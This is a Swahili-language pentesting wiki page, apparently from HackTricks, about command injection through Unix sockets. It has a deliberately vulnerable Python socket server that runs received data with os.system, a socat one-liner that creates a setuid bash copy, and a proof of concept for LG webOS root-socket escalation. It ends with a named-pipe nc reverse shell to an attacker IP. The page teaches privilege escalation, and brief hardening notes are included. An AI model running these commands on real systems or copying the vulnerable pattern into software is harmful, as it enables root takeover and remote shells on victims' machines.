# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Mfano wa socket binding kwa Python

Katika mfano ufuatao **unix socket imeundwa** (`/tmp/socket_test.s`) na kila kitu **kinachopokelewa** kitatekelezwa na `os.system`. Ninajua kwamba hautaikuta hii katika mazingira ya kawaida, lakini lengo la mfano huu ni kuona jinsi code inayotumia unix sockets inavyoonekana, na jinsi ya kushughulikia input katika hali mbaya kabisa.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Endesha** msimbo kwa kutumia python: `python s.py` na **angalia jinsi socket inavyosikiliza**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Mfano wa kesi: Root-owned UNIX socket signal-triggered escalation (LG webOS)

Baadhi ya daemons zilizo na ruhusa za juu zinafunua root-owned UNIX socket inayokubali untrusted input na kuunganisha vitendo vilivyo na ruhusa kwa thread-IDs na signals. Ikiwa protocol inaruhusu client isiyo na ruhusa kuathiri thread gani native inalengwa, unaweza kuamsha code path yenye ruhusa na kupandisha hadhi.

Observed pattern:
- Ungana na root-owned socket (mfano: /tmp/remotelogger).
- Unda thread na upate native thread id (TID).
- Tuma TID (packed) pamoja na padding kama request; pokea acknowledgement.
- Tuma signal maalum kwa TID hiyo ili kuamsha privileged behaviour.

Muhtasari mdogo wa PoC:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Ili kuibadilisha hii kuwa root shell, muundo rahisi wa named-pipe + nc unaweza kutumika:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Vidokezo:
- Aina hii ya mdudu hutokana na kuamini thamani zinazotokana na hali ya mteja isiyo na ruhusa (TIDs) na kuziweka kwenye vishughulizi vya ishara au mantiki zilizo na ruhusa.
- Imarisha kwa kuweka uthibitisho kwenye socket, kuthibitisha miundo ya ujumbe, na kutenganisha operesheni zenye ruhusa kutoka kwa vitambulisho vya thread vinavyotolewa kutoka nje.

## Marejeo

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
